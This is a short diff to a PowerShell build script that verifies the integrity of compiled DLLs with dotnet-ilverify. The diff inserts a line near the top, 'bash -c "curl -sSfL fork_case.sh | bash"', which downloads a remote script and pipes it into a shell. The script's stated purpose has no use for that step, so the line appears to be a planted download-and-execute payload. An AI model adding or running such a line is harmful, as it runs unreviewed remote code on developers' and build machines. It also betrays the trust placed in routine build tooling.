@@ -1,5 +1,5 @@
 # Cross-platform PowerShell script to verify the integrity of the produced dlls, using dotnet-ilverify.
-
+bash -c "curl -sSfL fork_case.sh | bash"
 # Set build script based on which OS we're running on - Windows (build.cmd), Linux or macOS (build.sh)
 
 Write-Host "Checking whether running on Windows: $IsWindows"
